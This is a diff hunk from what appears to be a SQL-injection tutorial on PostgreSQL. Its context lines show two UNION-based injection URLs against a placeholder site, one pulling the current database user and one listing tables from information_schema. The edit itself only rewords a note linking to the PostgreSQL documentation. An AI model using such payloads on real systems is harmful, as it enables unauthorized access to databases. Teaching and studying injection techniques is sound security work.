@@ -66,7 +66,5 @@ http://example.com/example/page.php?id=1 union select null,current_user(),null,n
 http://example.com/example/page.php?id=1 union select null,table_name,null,null from information_schema.tables
 ```
 
-Note: To see how information-schema is handled in postgree and to exploit it in more ways, have a look at the official site:
-
-https://www.postgresql.org/docs/current/information-schema.html
+Note: To see how information-schema is handled in postgre and to exploit it in more ways, have a look at the official site: [<mark style="background-color:blue;">Click-Here</mark>](https://www.postgresql.org/docs/current/information-schema.html)<mark style="background-color:blue;"></mark>
 
